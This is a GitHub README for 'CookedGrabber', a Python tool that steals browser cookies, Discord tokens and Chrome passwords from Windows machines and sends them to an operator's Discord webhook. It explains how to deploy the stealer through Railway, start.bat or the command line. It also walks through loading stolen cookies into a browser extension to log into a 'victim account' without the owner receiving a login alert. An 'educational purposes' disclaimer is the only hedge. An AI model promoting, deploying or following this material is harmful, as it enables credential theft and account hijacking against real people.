
<div align="center">
  <img src="https://imgur.com/lCyX6TX.png">
  <br>
  <br>
  <p>
    <img src="https://forthebadge.com/images/badges/made-with-python.svg">
    <img src="http://forthebadge.com/images/badges/built-with-love.svg">
  </p>
  <h4> Discord, Twitter, Instagram, netflix cookies, token grabber and also password grabber. Grabbing from all web browsers ! </h4>
  <p>
    <img alt="GitHub contributors" src="https://img.shields.io/github/contributors/mouadessalim/CookedGrabber">
    <img alt="GitHub issues" src="https://img.shields.io/github/issues/mouadessalim/CookedGrabber">
    <img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=shields">
    <img alt="GitHub pull requests" src="https://img.shields.io/github/issues-pr/mouadessalim/CookedGrabber">
    <img alt="GitHub commit activity" src="https://img.shields.io/github/commit-activity/m/mouadessalim/CookedGrabber">
  </p>
  <p align="center">
    <a href="#usage">Usage</a> •
    <a href="#cookies">Cookies</a> •
    <a href="#compatibility">Compatibility</a> •
    <a href="#disclaimer">Disclaimer</a> •
    <a href="#contributing">Contributing</a> •
    <a href="#license">License</a> •
    <a href="#other-projects">Other projects</a> 
  </p>
  <p align="center">
    <i>Loved the tool? Please consider <strong>donating</strong> 💸 to help it improve!</i>
  </p>

  <p align="center">
    <a href='https://ko-fi.com/mouadessalim' target='_blank'><img height='30' width="115" src='https://cdn.ko-fi.com/cdn/kofi3.png?v=2' alt='Buy Coffee for mouadessalim' />
    </a>
    <a href="https://www.buymeacoffee.com/mouadessalim" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="30" width="115" style="border-radius:1px" />
    </a>
  </p>
</div>

# 📈Usage

## Requirements ⚡

- **Windows 10** OS only (*win32, for x86, x86_64, and arm64 architectures*)
- **Python 3.x** (*python 3.9 used for the project.*)
- **Modules:** `$ pip install -r requirements.txt`

## 🚀 How to deploy and use ? (Out of Box)

We provide diverse and simple options to launch the bot depending on your needs.

### Option 1: One-Click Cloud Deployment (Railway) 🚂

It is extremely easy to deploy this grabber on Railway for **24/7 online hosting** without installing anything on your machine.

[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/new/template?template=https%3A%2F%2Fgithub.com%2Fmouadessalim%2FCookedGrabber&envs=WEBHOOK_URL)

1. Create a free account on [Railway.app](https://railway.app/).
2. Click on the button above or manually create a **New Project** and select **Deploy from GitHub repo**.
3. Choose your forked repository of `CookedGrabber`.
4. The dashboard will prompt you for the `WEBHOOK_URL` variable. Paste your Discord Webhook URL and click **Deploy**.
5. Railway will automatically build and deploy your app. The grabber is now active!

### Option 2: One-Click Local Execution (Windows) 🪟

If you just want to run the grabber instantly on your Windows machine:

1. Make sure you have **Python 3.9+** installed and added to your PATH.
2. Double-click on the **`start.bat`** file in the project folder.
3. The script will automatically install all dependencies (`requirements.txt`) for you.
4. It will then prompt you: `Enter your Discord Webhook URL:`.
5. Paste your URL, press Enter, and the grabber will execute natively!

### Option 3: Manual Command Line Execution 💻

For advanced users who prefer the terminal:

1. Install dependencies first:
   ```console
   pip install -r requirements.txt
   ```
2. You can set the Webhook URL as an environment variable before running:
   ```console
   set WEBHOOK_URL=https://discord.com/api/webhooks/...
   py CookedGrabber.py
   ```
3. Or pass it as a direct argument to the script:
   ```console
   py CookedGrabber.py YOUR_WEBHOOK_URL
   ```
4. Alternatively, you can hardcode your **webhook(s)** **link(s)** directly in the script from this line:
   https://github.com/mouadessalim/CookedGrabber/blob/f753c4bea37241d94253a288dd223c5ae8f7f371/CookedGrabber.py#L290

## Screenshots 📷

<p align="center">
  <img src="https://user-images.githubusercontent.com/38190847/188172516-da111666-ff8e-4cdb-86c4-1cbd82f87e91.png">
  <img src="https://user-images.githubusercontent.com/38190847/191291652-e617410c-62e8-489b-b8df-e738a9ed40c4.png">
</p>

# 🍪Cookies

## What are cookies ?

Cookies are text files with small pieces of data like a username and password that are used to identify your computer as you use a computer network. Specific cookies known as HTTP cookies are used to identify specific users and improve your web browsing experience.

Data stored in a cookie is created by the server upon your connection. This data is labeled with an ID unique to you and your computer.

When the cookie is exchanged between your computer and the network server, the server reads the ID and knows what information to specifically serve to you.

## What are cookies used for ?

Websites use HTTP cookies to streamline your web experiences. **Without cookies, you’d have to login again after you leave a site or rebuild your shopping cart if you accidentally close the page.** Making cookies an important a part of the internet experience. 

## Security breach with cookies

Since the data in cookies doesn't change, cookies themselves aren't harmful. They can't infect computers with viruses or other malware. However, some cyberattacks can hijack cookies and enable access to your browsing sessions.

The server only sends the cookie when it wants the web browser to save it. If you’re wondering “where are cookies stored,” it’s simple: your web browser will store it **locally** to remember the “name-value pair” that identifies you.

**⚠ When attempting to connect to an account using cookies, the system does not generate a new login request to the server. As a result, `the account owner does not receive an email notification` regarding a new login attempt. The server mistakenly assumes that the activity is coming from the legitimate account holder, leaving the owner unaware of any unauthorized access. !**

*****☢ This reveals major security breaches in general websites and social networks ! ☢*****

## How to bypass websites with cookies ?

So to use cookies to log into the victim account, you must have a cookies extension. I recommand [Cookie-Editor](https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm). **To bypass website security you must be already connected to your personnal account to generate all cookies needed for the website.** After being sure that all default cookies have been generated use your cookies extension to replace your personnal id account cookies with the grabbed victim account cookies.

#### *****Example: Instagram*****

![image](https://user-images.githubusercontent.com/38190847/191361287-696f24ae-986e-40f2-9e6d-eb95dddfdbc8.png)

You need to put each value in it's place with the cookies extension:

![image](https://user-images.githubusercontent.com/38190847/191360860-dd5c75b3-5663-4449-ba72-f4492b88cef2.png)

> Once the cookies replaced and saved, refresh the page and you are logged in the victim account !

# 🌐Compatibility

| Browsers           | Cookies and token grabber 🔍 | Password stealer 💥 | 
| :-----------:      | :-----------: | :-----------: |
| Chrome             | ✅ | ✅ |
| Edge               | ✅ | ❌ |
| Brave              | ✅ | ❌ |
| Firefox            | ✅ | ❌ |
| Opera (GX)         | ✅ | ❌ |
| Vivaldi            | ✅ | ❌ |
| Chromium navigator | ✅ | ❌ |

# ❗Disclaimer

- **Only for educationnal puposes.**
- **We decline any responsability in case of misuse of this code.**

# ✨Contributing

Your contributions are always welcome! if you contribute we will show your account in the README file ! Please have a look at the [contribution guidelines](CONTRIBUTING.md) first. 🎉

## Authors ❤

<a href="https://github.com/mouadessalim/CookedGrabber/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=mouadessalim/CookedGrabber" />
</a>
<br>
<br>

> **Working on your first Pull Request?** You can learn how from this *free* series [How to Contribute to an Open Source Project on GitHub](https://kcd.im/pull-request)
